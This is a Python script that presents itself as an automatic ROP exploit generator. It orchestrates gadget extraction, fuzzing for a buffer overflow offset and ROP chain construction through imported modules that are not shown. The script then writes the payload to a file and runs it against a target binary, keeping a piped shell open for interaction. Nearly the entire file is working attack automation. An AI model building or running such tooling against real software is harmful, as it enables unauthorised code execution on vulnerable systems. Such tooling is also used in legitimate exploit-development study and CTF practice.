# Command line args of vulnerable program binray (maybe uncompiled) and of the commands to insert
import sys
import os
import subprocess
import struct
import re
from struct import pack
import argparse

import fuzzing
import gadgetfinder as gf
import buildropchain as brc
    









if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Automatic ROP Exploit Generator",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument("program", help="Path to the vulnerable executable")

    parser.add_argument("commands", nargs='+', help="Commands to execute in the vulnerable program (e.g. '1', '2', '3')")
    
    parser.add_argument(
        "--fileinput", 
        choices=[0, 1], 
        type=int, 
        default=None,
        help="1 = Pass input via file argument\n0 = Pass input via STDIN pipe\n(Default: Auto-detect)"
    )
    
    parser.add_argument(
        "--inputs", 
        type=str, 
        default=None, 
        help="Input template/prefix to reach the vulnerable function.\nAccepts escape chars (e.g. '1\\n2\\n')."
    )
    
    parser.add_argument(
        "--flags", 
        type=str, 
        default=None, 
        help="Extra flags/arguments to pass to the vulnerable binary (e.g. '-v' or '--debug')."
    )
    parser.add_argument(
        "--brute-depth",
        type=int,
        default=None,
        help="Maximum depth for brute-force padding (Default: 100). If set to 0, disables brute-force and uses the input template only."
    )
    args = parser.parse_args()

    # --- Step 1: Validation ---
    if not os.path.isfile(args.program):
        print(f"[-] Error: The file {args.program} does not exist.")
        sys.exit(1)

    # --- Step 2: Gadget Extraction ---
    print("[*] Finding gadgets...")
    gf.find_gadgets(args.program) # Generates ropchain.txt
    
    try:
        gadgets = gf.extract_gadgets() # Parses ropchain.txt
        print("[+] Gadgets extracted successfully.")
    except Exception as e:
        print(f"[-] Error extracting gadgets: {e}")
        sys.exit(1)

    # --- Step 3: Fuzzing & Offset Detection ---
    print("[*] Starting Fuzzer to find offset...")
    
    # Call the fuzzer 
    prefix, offset = fuzzing.fuzz(
        vulnerable_program=args.program,
        fileinput=args.fileinput,
        input_template=args.inputs,
        flags=args.flags,
        brute_depth=args.brute_depth,
        print_debug=False
    )

    if offset is None or offset == -1:
        print("[-] Fuzzing failed. Could not determine offset.")
        sys.exit(1)

    print(f"[+] Buffer overflow offset confirmed: {offset} bytes.")

    # --- Step 4: Construct Payload ---
    print("[*] Constructing ROP Chain...")


    

    # A. Create Junk Padding
    padding = b"A" * offset
    
    # B. Build ROP Chain
    chain_builder = brc.ROPChainBuilder(args.program, gadgets)
    rop_chain = chain_builder.build_chain(args.commands, offset)
    
    # C. Combine
    # [ Menu Inputs | Brute-Force-Inputs] + [ Junk to reach EIP ] + [ ROP Chain ]
    full_payload = prefix + padding + rop_chain
    
    print(f"[+] Total payload size: {len(full_payload)} bytes")

    # --- Step 5: Execution ---
    filename = "badfile.txt"
    with open(filename, "wb") as f:
        f.write(full_payload)
    print(f"[+] Payload written to {filename}")

    # Detect Input Mode for final execution (in case auto-detect was used)
    if args.fileinput is None:
        use_file_mode = fuzzing.find_if_fileinput(args.program, args.flags.split() if args.flags else [])
    else:
        use_file_mode = bool(args.fileinput)

    print(f"[*] Executing exploit (Mode: {'File' if use_file_mode else 'STDIN'})...")
    print("-" * 40)

    try:
        if use_file_mode:
            
            subprocess.run([f"./{args.program}", filename])
        else:
            # We use shell=True here to easily handle the piping: (cat badfile; cat) | ./vuln
            # This keeps the pipe open for interaction if we spawn a shell
            print("Press RETURN")
            cmd = f"(cat {filename}; cat) | ./{args.program}"
            subprocess.run(cmd, shell=True)
            
    except KeyboardInterrupt:
        print("\n[*] Exiting.")
    



